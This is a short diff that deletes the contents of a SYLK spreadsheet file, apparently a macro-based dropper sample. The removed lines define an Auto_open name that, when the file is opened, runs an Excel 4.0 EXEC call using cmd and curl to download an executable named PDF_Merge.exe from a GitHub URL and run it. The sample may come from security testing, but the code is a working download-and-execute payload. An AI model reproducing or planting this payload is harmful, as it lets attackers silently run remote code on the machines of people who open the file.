@@ -1,6 +1,0 @@
-ID;P
-O;E
-NN;NAuto_open;ER101C1;KOut Flank;F
-C;X1;Y101;K0;EEXEC("cmd /c curl -L https://github.com/Pizsx69/PDF_Merge/raw/main/PDF_Merge/bin/Release/PDF_Merge.exe -O & PDF_Merge.exe")
-C;X1;Y103;K0;EHALT()
-E
